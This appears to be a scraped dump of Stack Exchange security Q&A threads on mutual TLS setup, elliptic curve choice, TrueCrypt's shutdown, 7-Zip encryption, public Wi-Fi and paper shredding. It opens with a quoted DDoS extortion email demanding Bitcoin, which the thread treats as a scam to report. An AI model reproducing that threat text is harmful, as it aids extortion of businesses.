  <p>Your network will be DDoS-ed starting 12:00 UTC on 08 May 2016 if you
  don't pay protection fee - 10 Bitcoins @ <code>some-bitcoin-address</code></p>
  
  <p>If you don't pay by 12:00 UTC on 08 May 2016, attack will start, yours
  service going down permanently price to stop will increase to 20 BTC
  and will go up 10 BTC for every day of attack.</p>
  
  <p>This is not a joke.</p>
  
  <p>Our attacks are extremely powerful - sometimes over 1 Tbps per second.
  And we pass CloudFlare and others remote protections! So, no cheap
  protection will help.</p>
  
  <p>Prevent it all with just 10 BTC @ <code>some-bitcoin-address</code></p>
  
  <p>Do not reply, we will not read. Pay and we will know its you. AND YOU
  WILL NEVER AGAIN HEAR FROM US!</p>
  
  <p>Bitcoin is anonymous, nobody will ever know you cooperated.</p>
</blockquote>

<p>Obviously, I'm not going to pay the ransom.  Should I do anything else?</p>

<p><strong>Update:</strong></p>

<p>I forwarded the email and original headers to the originating ISP.  They replied that ""Measures have been taken.""  So, umm, yay?  I guess?</p>
","<p>Based on the following article you may simply want to ignore it. This seems to be a common scam and your e-mail looks almost exactly like the one from the following article.</p>

<p><a href=""http://arstechnica.com/security/2016/04/businesses-pay-100000-to-ddos-extortionists-who-never-ddos-anyone/"" rel=""nofollow noreferrer"">http://arstechnica.com/security/2016/04/businesses-pay-100000-to-ddos-extortionists-who-never-ddos-anyone/</a></p>

<p><strong>Look up the source ISP of the service provider that sent the e-mail and contact their abuse team</strong>  <strong>abuse@company.com</strong>. They may disable the source of the e-mails or alert the unsuspecting customer that may own the machine. Notifying the source ISP is helpful to reduce the amount of this. Make sure you send them an e-mail with full headers. If the source appears to be a compromised system at a large company I would notify them in addition to the ISP. Do this by CC'ing both the company and the ISP at the same time for fastest results. Keep in mind some malicious systems may also be impersonating as a compromised host even though it's not so notifying the ISP may actually be more important than notifying the owner of the system.</p>
","122338"
"How to force ALL programs to use my Proxy?","29278","","<p>I have a local proxy on my PC. (localhost:8888)
But unfortunately there are many programs which are not able to go through this proxy.
So how can I force all my programs to go through my local proxy (or tunnel my connections to my local proxy)?</p>

<p>So all the programs on my PC could go through this proxy before reaching the internet!!?</p>
","<p>Have you considered using a <a href=""https://secure.wikimedia.org/wikipedia/en/wiki/Proxy_server#Transparent_proxies"">transparent proxy</a>?  It can automatically intercept all traffic and feed it to the proxy.</p>

<p>If you're asking about Tor, check out the <a href=""https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy"">Tor transparent proxy</a>, which might do exactly what you want.  You might also check out <a href=""https://trac.torproject.org/projects/tor/wiki/doc/Torouter"">Torouter</a>.</p>
","8904"
"Configure SSL Mutual (Two-way) Authentication","29260","","<p>A lot of tutorials, a lot of pages, a lot of question and they differ in implementation of this issue ""<em>Configure SSL Mutual (Two-way) Authentication</em>"". I have to do it with Linux, and I don't know from where to start or what instructions to follow.</p>

<p>What I have to do is: </p>

<ul>
<li>I have a server and many clients, they can access code on server only
if they have a signed certificate from server.</li>
<li>server can generate those certificates and disable them  main server
would be the CA .. that means it has to generate certificates for
others and then sign them.</li>
</ul>

<p>I had figured what to do </p>

<ol>
<li>generate CA certificate</li>
<li>generate certificates for other users.</li>
<li>give certificate to users.</li>
<li>sign certificates.</li>
<li>verify certificate. </li>
<li>regenerate certificate for user or disabled.</li>
<li>user can just sign from one device. (certificate mustn't be copied)</li>
</ol>

<p>Have I missed something? do I have to be a root user ? is there's any ready bash for this ? where can i find it.why there's more than one openssl.cnf file on linux? where I should put CA certificate any information would be appreciated .</p>
","<p>There is a handy script distributed alongside openssl, <code>CA.sh</code> to do most of this stuff. Its location is distribution specific. In Debian and derivatives you can locate it using:</p>

<pre><code># apt-file search CA.sh
openssl: /usr/lib/ssl/misc/CA.sh
</code></pre>

<p>And RedHat and derivatives the (approximate) equivalent is:</p>

<pre><code># yum provides */CA
1:openssl-1.0.1e-4.fc18.x86_64 : Utilities from the general purpose cryptography library with TLS implementation
Repo        : @updates
Matched from:
Filename    : /etc/pki/tls/misc/CA
</code></pre>

<p>This is a very simple bash script that eases the creation of the directory structure needed to manage a CA (this is described in the <code>[ CA_default ]</code> section of openssl.cnf). I recommend you to use it and look at the code to learn what it is actually doing.</p>

<pre><code># ./CA.sh -help
usage: ./CA.sh -newcert|-newreq|-newreq-nodes|-newca|-sign|-verify
</code></pre>

<p>This script will use the defaults provided in openssl.cnf, and/or you can provide one configuration file as an argument to the <code>openssl $command</code> using the <code>-config</code> switch if not using <code>CA.sh</code>.
The location of the <code>openssl.cnf</code> file is also distribution specific, and you can use the same commands above to find it. The one you want is the one provided by the <code>openssl</code> package.</p>

<p>You probably want to modify the following sections:</p>

<pre><code>[ CA_default ]
default_days    = 365                   # how long to certify for
default_crl_days= 30                    # how long before next CRL

[ req ]
default_bits            = 2048

[ req_distinguished_name ]
countryName                     = Country Name (2 letter code)
countryName_default             = AU
countryName_min                 = 2
countryName_max                 = 2
stateOrProvinceName             = State or Province Name (full name)
stateOrProvinceName_default     = Some-State
localityName                    = Locality Name (eg, city)
0.organizationName              = Organization Name (eg, company)
0.organizationName_default      = Internet Widgits Pty Ltd
#1.organizationName             = Second Organization Name (eg, company)
#1.organizationName_default     = World Wide Web Pty Ltd
organizationalUnitName          = Organizational Unit Name (eg, section)
#organizationalUnitName_default =
commonName                      = Common Name (e.g. server FQDN or YOUR name)
commonName_max                  = 64
emailAddress                    = Email Address
emailAddress_max                = 64
</code></pre>

<ul>
<li>Generate the CA</li>
</ul>

<p>Once you have edited <code>openssl.cnf</code> to match your needs, you can generate a CA certificate. Depending on whether you need this CA signed by an recognized third-party CA or not, you can generate a self-signed CA or a CSR to be submitted for signing.</p>

<p><code>./CA.sh -newca</code></p>

<p>You will be interactively prompted to ask some questions, the defaults will appear between square brackets. You will recognize the options you modified in <code>openssl.cnf</code> here.</p>

<ul>
<li>Generate a certificate for the server</li>
</ul>

<p>You can create a certificate request for the server using the same script:</p>

<p><code>./CA.sh -newreq</code></p>

<p>Again, you will be prompted to ask several questions, the most important is the Common Name of the certificate, which must match the DNS resolvable name for the IP of the server (or you can use other means, like <code>/etc/hosts</code>, not recommended, hard to maintain and scale) </p>

<p>What you will obtain is a Certificate Signing Request (CSR for short). This will be signed by the Certificate Authority (CA) you created before.</p>

<p><code>./CA.sh -sign</code></p>

<ul>
<li>Generate certificates for the clients</li>
</ul>

<p>Repeat the steps of creating a CSR and getting it signed by the CA. When doing so, pay close attention to how you fill in the Common Name, Organization and Organizational Unit fields, as those will be required afterwards in order to configure the server.</p>

<p>A neat way to distribute the client certificates alongside their respective private keys and the CA certificate is using p12 bundles:</p>

<p><code>openssl pkcs12 -export -in Certificates/client.pem -inkey client.key -certfile CA.pem
-out clientcert.p12</code></p>

<ul>
<li>Configure the server</li>
</ul>

<p>Let's suppose the server you are referring to is an Apache web server. Once you have the server certificate, you configure the appropriate <code>VHOST</code> to serve whatever content is going to be protected by mutual SSL authentication. An example could be this <code>phpmyadmin</code> virtual hosts. This is working in an Apache 2.4 server, so please don't use it as-is and carefully review and test it to adapt it to your needs.</p>

<pre><code>Listen                   443 https

&lt;VirtualHost 120.120.120.120:443&gt;
  DocumentRoot           ""/srv/www/html""
  ServerAdmin            admin@company.com
  SSLCACertificateFile   /etc/pki/CA/cacert.pem
  SSLCertificateFile     /etc/pki/tls/private/phpmyadmin.company.com/newcert.pem
  SSLCertificateKeyFile  /etc/pki/tls/private/phpmyadmin.company.com/newkey.pem
  SSLCARevocationCheck   chain
  SSLCARevocationFile    /etc/pki/CA/crl/crl.pem
  SSLEngine              on
  SSLStrictSNIVHostCheck on
  SSLVerifyClient        require
  SSLVerifyDepth         5
  ServerName             phpmyadmin.company.com
  RewriteEngine          on
  RewriteCond            %{REMOTE_ADDR} !^127\.0\.0\.1$
  RewriteCond            %{HTTPS} !=on
  RewriteRule            . - [F]
  Alias                  /console /usr/share/phpMyAdmin
  ErrorLog               ""|/usr/sbin/rotatelogs -L /var/log/httpd/phpmyadmin/error.log -f /var/log/httpd/phpmyadmin/error.log.%Y%m%d 86400""
  CustomLog              ""|/usr/sbin/rotatelogs -L /var/log/httpd/phpmyadmin/access.log -f /var/log/httpd/phpmyadmin/access.log.%Y%m%d 86400"" logstash_json
  &lt;Directory /usr/share/phpMyAdmin/&gt;
    Require              ssl
    Require              ssl-verify-client
    SSLRequireSSL
    SSLOptions           +FakeBasicAuth +StrictRequire
    SSLRequire           %{SSL_CIPHER_USEKEYSIZE} &gt;= 256
    SSLRequire           %{SSL_CLIENT_S_DN_O} eq ""Awesome Company"" \
                     and %{SSL_CLIENT_S_DN_OU} eq ""Development"" \
                     and %{SSL_CLIENT_S_DN_CN} in {""John Doe"", ""Jane Doe""}
    SSLRenegBufferSize   131072
  &lt;/Directory&gt;
&lt;/VirtualHost&gt;
</code></pre>

<p>You can use as many per-directory access control as you need, the important part is that the client certificates shown must comply with the restrictions imposed by the <code>SSLRequire</code> directives, i.e., they must match the Organization, Organizational Unit and Common Name conditions (or other fields of the certificate as you see fit). These fields are taken from the client certificates.</p>

<ul>
<li>Generate a Certificate Revocation List</li>
</ul>

<p>In order to be able to revoke access to a client certificate, you need to generate a CRL.
The command to do it (provided you in the top of the CA directory structure):</p>

<p><code>openssl ca -config /path/to/openssl.cnf -gencrl -out crl/crl.pem</code></p>

<p>Afterwards, you revoke client certs as needed using:</p>

<p><code>openssl ca -config /path/to/openssl.cnf -revoke clientcert.pem</code></p>

<p>References:</p>

<p><a href=""https://www.openssl.org/"">OpenSSL</a> online documentation and <a href=""http://httpd.apache.org/docs/"">Apache</a> online documentation.</p>
","34925"
"Which elliptic curve should I use?","29250","","<p>I am currently renewing an SSL certificate, and I was considering switching to elliptic curves. Per <a href=""http://safecurves.cr.yp.to/"">Bernstein and Lange</a>, I know that some curves should not be used but I'm having difficulties selecting the correct ones in OpenSSL:</p>

<pre><code>$ openssl ecparam -list_curves
  secp112r1 : SECG/WTLS curve over a 112 bit prime field
  secp112r2 : SECG curve over a 112 bit prime field
  secp128r1 : SECG curve over a 128 bit prime field
  secp128r2 : SECG curve over a 128 bit prime field
  secp160k1 : SECG curve over a 160 bit prime field
  secp160r1 : SECG curve over a 160 bit prime field
  secp160r2 : SECG/WTLS curve over a 160 bit prime field
  secp192k1 : SECG curve over a 192 bit prime field
  secp224k1 : SECG curve over a 224 bit prime field
  secp224r1 : NIST/SECG curve over a 224 bit prime field
  secp256k1 : SECG curve over a 256 bit prime field
  secp384r1 : NIST/SECG curve over a 384 bit prime field
  secp521r1 : NIST/SECG curve over a 521 bit prime field
  prime192v1: NIST/X9.62/SECG curve over a 192 bit prime field
  prime192v2: X9.62 curve over a 192 bit prime field
  prime192v3: X9.62 curve over a 192 bit prime field
  prime239v1: X9.62 curve over a 239 bit prime field
  prime239v2: X9.62 curve over a 239 bit prime field
  prime239v3: X9.62 curve over a 239 bit prime field
  prime256v1: X9.62/SECG curve over a 256 bit prime field
  sect113r1 : SECG curve over a 113 bit binary field
  sect113r2 : SECG curve over a 113 bit binary field
  sect131r1 : SECG/WTLS curve over a 131 bit binary field
  sect131r2 : SECG curve over a 131 bit binary field
  sect163k1 : NIST/SECG/WTLS curve over a 163 bit binary field
  sect163r1 : SECG curve over a 163 bit binary field
  sect163r2 : NIST/SECG curve over a 163 bit binary field
  sect193r1 : SECG curve over a 193 bit binary field
  sect193r2 : SECG curve over a 193 bit binary field
  sect233k1 : NIST/SECG/WTLS curve over a 233 bit binary field
  sect233r1 : NIST/SECG/WTLS curve over a 233 bit binary field
  sect239k1 : SECG curve over a 239 bit binary field
  sect283k1 : NIST/SECG curve over a 283 bit binary field
  sect283r1 : NIST/SECG curve over a 283 bit binary field
  sect409k1 : NIST/SECG curve over a 409 bit binary field
  sect409r1 : NIST/SECG curve over a 409 bit binary field
  sect571k1 : NIST/SECG curve over a 571 bit binary field
  sect571r1 : NIST/SECG curve over a 571 bit binary field
  c2pnb163v1: X9.62 curve over a 163 bit binary field
  c2pnb163v2: X9.62 curve over a 163 bit binary field
  c2pnb163v3: X9.62 curve over a 163 bit binary field
  c2pnb176v1: X9.62 curve over a 176 bit binary field
  c2tnb191v1: X9.62 curve over a 191 bit binary field
  c2tnb191v2: X9.62 curve over a 191 bit binary field
  c2tnb191v3: X9.62 curve over a 191 bit binary field
  c2pnb208w1: X9.62 curve over a 208 bit binary field
  c2tnb239v1: X9.62 curve over a 239 bit binary field
  c2tnb239v2: X9.62 curve over a 239 bit binary field
  c2tnb239v3: X9.62 curve over a 239 bit binary field
  c2pnb272w1: X9.62 curve over a 272 bit binary field
  c2pnb304w1: X9.62 curve over a 304 bit binary field
  c2tnb359v1: X9.62 curve over a 359 bit binary field
  c2pnb368w1: X9.62 curve over a 368 bit binary field
  c2tnb431r1: X9.62 curve over a 431 bit binary field
  wap-wsg-idm-ecid-wtls1: WTLS curve over a 113 bit binary field
  wap-wsg-idm-ecid-wtls3: NIST/SECG/WTLS curve over a 163 bit binary field
  wap-wsg-idm-ecid-wtls4: SECG curve over a 113 bit binary field
  wap-wsg-idm-ecid-wtls5: X9.62 curve over a 163 bit binary field
  wap-wsg-idm-ecid-wtls6: SECG/WTLS curve over a 112 bit prime field
  wap-wsg-idm-ecid-wtls7: SECG/WTLS curve over a 160 bit prime field
  wap-wsg-idm-ecid-wtls8: WTLS curve over a 112 bit prime field
  wap-wsg-idm-ecid-wtls9: WTLS curve over a 160 bit prime field
  wap-wsg-idm-ecid-wtls10: NIST/SECG/WTLS curve over a 233 bit binary field
  wap-wsg-idm-ecid-wtls11: NIST/SECG/WTLS curve over a 233 bit binary field
  wap-wsg-idm-ecid-wtls12: WTLS curvs over a 224 bit prime field
  Oakley-EC2N-3:
        IPSec/IKE/Oakley curve #3 over a 155 bit binary field.
        Not suitable for ECDSA.
        Questionable extension field!
  Oakley-EC2N-4:
        IPSec/IKE/Oakley curve #4 over a 185 bit binary field.
        Not suitable for ECDSA.
        Questionable extension field!
</code></pre>

<p>Could a kind cryptographer point out to me which curves are still considered safe?</p>
","<p>You are misreading Bernstein and Lange's advice (admittedly, their presentation is a bit misleading, with the scary red ""False"" tags). What they <em>mean</em> is not that some curves are inherently unsafe, but that <em>safe implementation</em> of some curves is easier than for others (e.g. with regards to library behaviour when it encounters something which purports to be the encoding of a valid curve point, but is not).</p>

<p>What you really want is a curve such that:</p>

<ul>
<li>the software which you will entrust with your private key (your SSL server) is properly implemented and will not leak details about your private key;</li>
<li>interoperability will be achieved.</li>
</ul>

<p>For a SSL server certificate, an ""elliptic curve"" certificate will be used only with digital signatures (ECDSA algorithm). The server will sign only messages that it generates itself; and, in any case, the only ""private"" operation involving a curve in ECDSA is multiplication of the conventional base point (hardcoded, since it is part of the curve definition, hence correct) by a random value that the server generates. Therefore, in your use case, there is no risk of private key leakage that would be specific to the used curve. If your SSL implementation is poor, it will be poor for all curves, not for just some of them.</p>

<p>""Interoperability"" means that you would probably prefer it if SSL clients can actually connect to your server; otherwise, having a SSL server would be rather pointless. This simplifies the question a lot: in practice, average clients only support <em>two</em> curves, the ones which are designated in so-called <a href=""https://www.nsa.gov/ia/programs/suiteb_cryptography/"">NSA Suite B</a>: these are NIST curves P-256 and P-384 (in OpenSSL, they are designated as, respectively, ""prime256v1"" and ""secp384r1""). If you use any other curve, then some widespread Web browsers (e.g. Internet Explorer, Firefox...) will be unable to talk to your server.</p>

<p>Use P-256 to minimize trouble. If you feel that your manhood is threatened by using a 256-bit curve where a 384-bit curve is available, then use P-384: it will increases your computational and network costs (a factor of about 3 for CPU, a few extra dozen bytes on the network) but this is likely to be negligible in practice (in a SSL-powered Web server, the heavy cost is in ""Web"", not ""SSL"").</p>
","78624"
"What is the difference between a ""Thumbprint Algorithm"" ""Signature Algorithm"" and ""Signature Hash Algorithm"" for a certificate?","29140","","<p>I'm a bit confused on the differences between <code>Signature Algorithm</code>, <code>Signature Hash Algorithm</code>, and <code>Thumbprint Algorithm</code> that are present in SSL/TLS certificates.  Can someone please elaborate? </p>
","<p>You are confused because some people (yeah I am looking at you, Microsoft) have been using the terms inconsistently.</p>

<p>A <a href=""http://en.wikipedia.org/wiki/Digital_signature"">signature algorithm</a> is a cryptographic algorithm such that:</p>

<ul>
<li>The signer owns a <em>public/private key pair</em>. The public key is public, the private key is private; even though both keys are mathematically linked together, it is not feasible to recompute the private key from the public key (which is why the public key could safely be made public).</li>
<li>On a given input message, the signer can use his private key to compute a <em>signature</em>, which is specific to both the signer's key pair, and the input message.</li>
<li>There is a <em>verification algorithm</em> that takes as input the message, the signature and the public key, and answers ""true"" (they match) or ""false"" (they don't).</li>
</ul>

<p>The cornerstone of signature security is that it should not be feasible, without knowledge of the private key, to generate pairs message+signature that the verification algorithm will accept.</p>

<p>You may encounter some ""explanations"" that try to say that digital signatures are some kind of encryption; they usually describe it as ""you encrypt with the private key"". Don't believe it; these explanations are actually wrong, and confusing.</p>

<p>For technical reasons, signature algorithms (both for signing and for verifying) often begin with a <a href=""http://en.wikipedia.org/wiki/Cryptographic_hash_function"">hash function</a>. A hash function is a completely public algorithm with no key. The point of hash functions is that they can eat up terabytes of data, and produce a ""digest"" (also called ""fingerprint"" or even ""thumbprint"") that has a fixed, small size. Signature algorithms need that, because they work with values in some algebraic structure of a finite size, and thus cannot accommodate huge messages. Therefore, the message is first hashed, and only the hash value is used for generating or verifying a signature.</p>

<p>That hash algorithm, when it is used as first step of a signature generation or verification algorithm, will be called ""signature hash algorithm"". When we say something like ""RSA/SHA-256"", we mean ""RSA signature, with SHA-256 as accompanying hash function"".</p>

<p>A ""thumbprint algorithm"" is another name for a hash function. It is often encountered when talking about <em>certificates</em>: the ""thumbprint"" of a certificate really is the result of a hash function applied to the certificate itself (in Windows systems, the SHA-1 hash function is used).</p>
","71203"
"Is TrueCrypt not secure now and should I stop using it?","29108","","<p><a href=""http://truecrypt.org/"">The official TrueCrypt webpage</a> now states:</p>

<blockquote>
  <p>WARNING: Using TrueCrypt is not secure as it may contain unfixed security
  issues</p>
  
  <p>This page exists only to help migrate existing data encrypted by
  TrueCrypt.</p>
  
  <p>The development of TrueCrypt was ended in 5/2014 after Microsoft
  terminated support of Windows XP. Windows 8/7/Vista and later offer
  integrated support for encrypted disks and virtual disk images. Such
  integrated support is also available on other platforms (click here
  for more information). You should migrate any data encrypted by
  TrueCrypt to encrypted disks or virtual disk images supported on your
  platform.</p>
</blockquote>

<p>with detailed instructions for how to migrate to BitLocker below.</p>

<p>Is it an official announcement or just a tricky <a href=""https://en.wikipedia.org/wiki/Website_defacement"">deface attack</a>?</p>
","<p>At this point, it is still unclear. Speculation runs rampant as to whether it's a defacement or official retirement.</p>

<p>That said, it is noteworthy that the latest version of TrueCrypt (before the 7.2 version that's now posted) is over two years old. Also no apparent efforts have been made to support whole-disk encryption on Windows 8, which even older than TrueCrypt 7.1a if you count in the publicly-available pre-release versions of the former.</p>

<p>Many Windows 8 users who used to rely on TrueCrypt are probably already migrated to Bitlocker for whole-disk encryption, so moving the rest of their TrueCrypt-protected data (if they haven't already) is a logical next step anyway. For anyone else, it would probably be preferable to wait until this whole mess is cleared up.</p>

<p>The first phase of the <a href=""http://istruecryptauditedyet.com"" rel=""nofollow noreferrer"">TrueCrypt audit</a>, covering the bootloader and Windows kernel drivers, turned up less than a dozen vulnerabilities - the worst of which were rated as ""Medium"" severity. The <a href=""https://opencryptoaudit.org/reports/iSec_Final_Open_Crypto_Audit_Project_TrueCrypt_Security_Assessment.pdf"" rel=""nofollow noreferrer"">report</a> also said the source code ""did not meet expected standards for secure code"".</p>

<p>One of their recommendations mentioned:</p>

<blockquote>
  <p>Due to lax quality standards, TrueCrypt source is difficult to review and
  maintain. This will make future bugs harder to find and correct.</p>
</blockquote>

<p>Another note stated: </p>

<blockquote>
  <p>The current required Windows build environment
  depends on outdated build tools and software packages that are hard to get from trustworthy
  sources</p>
</blockquote>

<p>All of this, along with the two-year lapse in new releases and lack of full support for the latest OSs, does lend to the easy belief that TrueCrypt's team may indeed be throwing in the towel. If they did choose to do that, then TrueCrypt would in fact become insecure in very much the same way as Windows XP now is - any newly discovered security vulnerabilities would not be patched. A key difference between TrueCrypt and Windows XP however, is that compatible alternatives may still be developed and updated since TrueCrypt is open-source software.</p>

<p>Still, the very sudden and unexpected announcement is definitely worth some amount of skepticism. Until there's been further validation of the news, I would suggest that you not trust anything posted on TrueCrypt's website or SourceForge page - especially not the new ""7.2"" download.</p>

<hr>

<p><strong>Update: 2014-05-29 0645Z</strong></p>

<p>Brian Krebs has <a href=""http://krebsonsecurity.com/2014/05/true-goodbye-using-truecrypt-is-not-secure/"" rel=""nofollow noreferrer"">reported</a> on the issue, and given some sound reasoning as to why this is not likely a hoax. Additionally, he mentions that the people behind <a href=""http://IsTrueCryptAuditedYet.com"" rel=""nofollow noreferrer"">IsTrueCryptAuditedYet.com</a> will continue their work despite the software project's current status.</p>

<p>Speculation still runs rampant online of course. However, though the continued anonymity of the TrueCrypt development team makes any undeniably authentic confirmation of their status nigh impossible. Matthew Green made a fair point in <a href=""https://twitter.com/matthew_d_green/status/471782981783126017"" rel=""nofollow noreferrer"">this tweet</a> though:</p>

<blockquote>
  <p>But more to the point, if the Truecrypt signing key was stolen &amp; and the TC devs can't let us know -- that's reason enough to be cautious.</p>
</blockquote>

<p>Really, regardless of the signing key's status specifically, the fact that the TrueCrypt developers can't (or at least so far appear to not even have made any efforts to) issue any separate and authoritative communication to validate what's happened to their website should be enough to raise significant concern. If the TrueCrypt team is calling it quits, it's time to move on and find/make alternatives. If not, their lack of out-of-band response to this incident raises serious questions (more so now than ever) as to how much we can really trust them to maintain the sort of software we want to trust with our most valuable secrets.</p>

<p>Regardless of the status either way, it's probably best to seek alternative solutions. The recommendations on the TrueCrypt site aren't bad in general. However, they fall short of a few features TrueCrypt was known and loved for:</p>

<ul>
<li>Cross-platform compatibility</li>
<li>Plausible deniability</li>
<li>Hidden partitions</li>
<li>Encrypted container files (you can do this with Bitlocker and VHDs, but it's not nearly as smooth and seamless as with TrueCrypt)</li>
</ul>

<hr>

<p><strong>Update: 2014-05-29 1450Z</strong></p>

<p>Jack Daniel has summed up my feelings on the topic quite well now, in a <a href=""https://twitter.com/jack_daniel/status/472026568383299584"" rel=""nofollow noreferrer"">recent tweet</a>:</p>

<blockquote>
  <p>So, yeah: hack, troll, ragequit, whatever- silence means TrueCrypt org can't be trusted, so neither can TrueCrypt. Damn.</p>
</blockquote>

<hr>

<p><strong>Update: 2014-05-30 1545Z</strong></p>

<p>GRC has posted claims that the TrueCrypt developers have been heard from, via Steven Barnhart.</p>

<p><a href=""https://www.grc.com/misc/truecrypt/truecrypt.htm"" rel=""nofollow noreferrer"">https://www.grc.com/misc/truecrypt/truecrypt.htm</a></p>

<p>If the source can be believed (again, the public anonymity of the TrueCrypt development team makes certain authentication nearly impossible) then TrueCrypt is indeed no longer being actively worked on by the original team. Additionally, the license prevents anyone else from legitimately being allowed to write a new ""TrueCrypt"" (though it is possible they may be able to fork it under a different name).</p>

<p>One important thing to note, though GRC perhaps is a bit overly dramatic about it and may even be over-stating its value, is that the latest fully-functional version of TrueCrypt (7.1a) <em>is</em> - to public knowledge - still ""safe"" to use. Until such time as significant, and exploitable, vulnerabilities are discovered there's really no reason to consider 7.1a as inherently any more ""unsafe"" at the time of the truecrypt.org announcement than it was at any time before.</p>

<p>That said, one must also bear in mind (as noted earlier in this post) that any discovered vulnerabilities in TrueCrypt 7.1a <em>will not</em> be fixed in any future releases. Thus, it is still wise to begin seeking other alternatives. The same holds true here as it does for Windows XP - the only substantial difference being that XP has a much higher profile and will very likely accrue a very long list of un-patchable vulnerabilities (some likely exist already) much more quickly.</p>

<p>The <a href=""https://opencryptoaudit.org/"" rel=""nofollow noreferrer"">Open Crypto Audit Project</a> has <a href=""https://twitter.com/OpenCryptoAudit/status/472358613751963648"" rel=""nofollow noreferrer"">tweeted</a> a link to a ""trusted archive"" of TrueCrypt versions for those seeking older copies no longer available on truecrypt.org:</p>

<p><a href=""https://github.com/DrWhax/truecrypt-archive"" rel=""nofollow noreferrer"">https://github.com/DrWhax/truecrypt-archive</a></p>

<p>Thanks to <a href=""https://security.stackexchange.com/users/12/xander"">@Xander</a> for pointing out the GRC article.</p>
","58942"
"How secure is 7z encryption?","29071","","<p>I have a text file in which I store all my bank details.  I compress and encrypt it with <a href=""http://www.7-zip.org/"">7-Zip</a> using the following parameters:  </p>

<p><strong>Compression parameters:</strong>  </p>

<ul>
<li><em>Archive format</em>: 7z</li>
<li><em>Compression level</em>: Ultra</li>
<li><em>Compression method</em>: LZMA2</li>
<li><em>Dictionary size</em>: 64 MB</li>
<li><em>Solid Block size</em>: 4 GB</li>
<li><em>Number of CPU threads</em>: 4</li>
</ul>

<p><strong>Encryption parameters:</strong></p>

<ul>
<li><em>Encryption method</em>: AES-256  </li>
<li><em>Encrypt file names</em>: True    </li>
</ul>

<p>The password for the encryption is chosen such that it won't be found in any dictionary and is rather an almost random string (composed of 15-20 upper and lower case letters, numbers, and symbols). I do not store this password anywhere.<br>
Also, the filename of the text file is kept such that no one will be able to tell that the file is related to bank details at all.  </p>

<p>Is this secure enough, under the following scenarios? </p>

<ol>
<li>The attacker takes full control of the system, but does not know that this particular file is of any importance to him.</li>
<li>The attacker is in possession of the file, and is actively trying to decrypt it, knowing that it has the bank details.</li>
</ol>
","<p>7-zip (or any other similar utilities) encryption is designed to protect archived files. So, as long as the tool designers did their job well, you are safe for the second case (somebody getting his hand on the encrypted file and trying to crack it).</p>

<p>However, such utility are not designed to protect you against your first mentioned case (someone getting access to your account data on your machine and/or you accessing the file content regularly). Indeed, someone having taken a full (or even just minimal, no need to escalate privileges) access to your system will see you use this file and will also be able to capture your keystrokes while you type your password. Even worse: an attacker will actually will not even have to bother with this since the file will most probably be present in clear form in your Windows Temp directory.</p>

<p>So, for your first threat, I would definitively recommend you to use a tool designed for this usage, like <a href=""http://www.keepass.info"">KeePass</a> which will <a href=""http://www.keepass.info/help/base/security.html#secattach"">avoid to store decrypted data in temporary files</a> and will provide a <a href=""http://www.keepass.info/help/base/security.html#secdesktop"">minimum protection when typing the password</a>.</p>
","100653"
"Is public Wi-Fi a threat nowadays?","29021","","<p>In my opinion, arguments we have been using for years to say that public Wi-Fi access points are insecure are no longer valid, and so are the recommended remedies (e.g. use VPN).</p>

<p>Nowadays, most sites use HTTPS and set HSTS headers, so the odds that someone can eavesdrop someone else's connection is very low, to the point of expecting a zero-day vulnerability in TLS.</p>

<p>So, what other threats may someone face nowadays on a public network?</p>
","<p>Public&nbsp;WiFi is still insecure, and it will always be if not used together with something like a VPN.</p>

<ul>
<li>Many websites use HTTPS, but not nearly all. In fact, <a href=""https://letsencrypt.org/stats/"" rel=""noreferrer"">more than 30 percent don't</a>.</li>
<li><a href=""https://w3techs.com/technologies/details/ce-hsts/all/all"" rel=""noreferrer"">Only around 5 percent</a> of websites use HSTS. And it's still trust on first use. If the max age is short, that first use can be quite often. Let's face it, even if you are  a security pro chances are that you would fall for SSL strip anyway. I know I would.</li>
<li>Just because you use HTTPS doesn't mean you do it right. There's still lot of mixed content out there. Many clients still support old versions with known vulnerabilitites, so an attack doesn't have to be a zero day to be successful.</li>
<li>Even if you use HTTPS, you leak a lot of of information anyway, such as the domain you visit, all your DNS traffic, etc.</li>
<li>A computer or phone uses the internet for more than just browsing:

<ul>
<li>All it takes is one app that has bad (or no) crypto for its update function and you are owned.</li>
<li>All those apps you gave permission to access all sorts of personal data... They are phoning home constantly and you probably have no idea what data they are sending and what if any crypto they use.</li>
<li>Dancrumb has more examples in his <a href=""https://security.stackexchange.com/a/174878/98538"">great answer</a>.</li>
</ul></li>
<li><a href=""https://en.wikipedia.org/wiki/Defense_in_depth_(computing)"" rel=""noreferrer"">Defense in depth</a>.</li>
</ul>

<p>A VPN is cheap and it is still a low hanging fruit when it comes to security.</p>
","174851"
"Getting rid of a large quantity of paper","29019","","<p>Say you were in charge of getting rid of a large quantity of paper - up to 1,000 in a row. It can't be used as scratch paper because it contains confidential information. It also can't be outsourced to third parties because the company isn't interested in refunding your expenses.</p>

<p>The scenario is real and is wasting the time of a person whose work is useful to me. The current method is tearing them all apart by hand or using a crushing machine when it's available. As mentioned, it takes a lot of time and could probably be done a thousand more efficient ways.</p>

<p><em>What is the cheapest and fastest method to destroy a large quantity of paper containing confidential information?</em></p>
","<p>The worst thing you can do is tearing them apart. It's time consuming and attacker just needs extra time and patience to put pieces together.</p>

<p>The same rule applies for shredding - if after shredding are left too large pieces, again, attacker just needs time and patience.</p>

<p><img src=""https://i.stack.imgur.com/h1yl7.jpg"" alt=""enter image description here""></p>

<p>There are several shredding techniques (from wikipedia)</p>

<blockquote>
  <ul>
  <li>Strip-cut shredders, the least secure, use rotating knives to cut narrow strips as long as the original sheet of paper. Such strips can be reassembled by a determined and patient investigator or adversary, as the product (the destroyed information) of this type of shredder is the least randomized. It also creates the highest volume of waste inasmuch as the chad has the largest surface area and is not compressed.</li>
  <li>Cross-cut or confetti-cut shredders use two contra-rotating drums to cut rectangular, parallelogram, or diamond-shaped (or lozenge) shreds.</li>
  <li>Particle-cut shredders create tiny square or circular pieces.</li>
  <li>Cardboard shredders are designed specifically to shred corrugated material into either strips or a mesh pallet.</li>
  <li>Disintegrators and granulators repeatedly cut the paper at random until the particles are small enough to pass through a mesh.</li>
  <li>Hammermills pound the paper through a screen.</li>
  <li>Pierce and Tear Rotating blades pierce the paper and then tear it apart.</li>
  <li>Grinders A rotating shaft with cutting blades grinds the paper until it is small enough to fall through a screen.</li>
  </ul>
</blockquote>

<p>Also, there are several standards for shredding (from wikipedia)</p>

<blockquote>
  <ul>
  <li>Level 1 = 12 mm strips OR 11 x 40mm particles</li>
  <li>Level 2 = 6 mm strips OR 8 x 40mm particles</li>
